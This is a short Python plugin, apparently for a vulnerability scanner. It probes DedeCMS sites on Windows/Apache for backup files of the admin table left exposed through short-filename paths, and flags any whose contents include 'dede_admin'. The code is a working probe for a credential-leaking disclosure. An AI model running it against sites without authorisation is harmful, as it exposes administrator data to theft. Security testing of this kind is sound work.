#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'

import urllib.parse
import requests
requests.packages.urllib3.disable_warnings()

def get_script_info(data=None):
    script_info = {
        "name": "dedecms_win_apache_shortfile",
        "info": "dedecms_win_apache_shortfile.",
        "level": "low",
        "type": "info"
    }
    return script_info

def prove(data):
    data = init(data,'web')
    if data['base_url']:
        dir = '/data/backupdata/dede_a~'
        for i in range(1, 6):
            url = data['base_url'] + dir + str(i) + '.txt'
            try:
                res = requests.get(url, headers=data['headers'], timeout=data['timeout'])
                if res.status_code == 200 :
                    if 'dede_admin' in res.text:
                        data['flag'] = 1
                    else:
                        data['flag'] = 0
                    data['data'].append({"url": url})
                    data['res'].append({"info": url, "key": 'dede_admin'})
            except Exception as e:
                continue
    return data
